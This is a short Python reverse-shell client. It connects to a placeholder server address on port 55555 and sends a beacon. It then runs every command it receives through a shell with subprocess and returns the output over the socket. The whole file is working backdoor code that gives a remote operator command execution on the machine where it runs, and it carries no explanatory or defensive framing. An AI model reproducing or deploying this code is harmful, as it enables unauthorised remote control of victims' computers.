import subprocess
import socket
import os

IP = "SERVER IP"
PORT = 55555
addr = (IP, PORT)

def get_output(command):
	if "cd" in command:
		try:
			command = command.split(" ")
			print(command)
			os.chdir(str(command[1]))
			return "No output"
		except:
			return f"No directory {str(command[1])} found"
	else:
		try:
			print(command)
			direct_output = subprocess.check_output(command, shell=True) #could be anything here.
			print(direct_output)
			if direct_output.decode("utf-8") == "":
				return "No output"
			else:
				return direct_output
		except :
			return f"Command {command} not recognized"

def handling(target):
	while True:
		try:
			command = target.recv(1024).decode("ascii")
			output = get_output(command)
			try:
				output = str(output, "utf-8")
			except:
				pass
			target.send(output.encode("ascii"))
		except KeyboardInterrupt:
			break



target = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
target.connect(addr)
target.send("T".encode("ascii"))
handling(target)
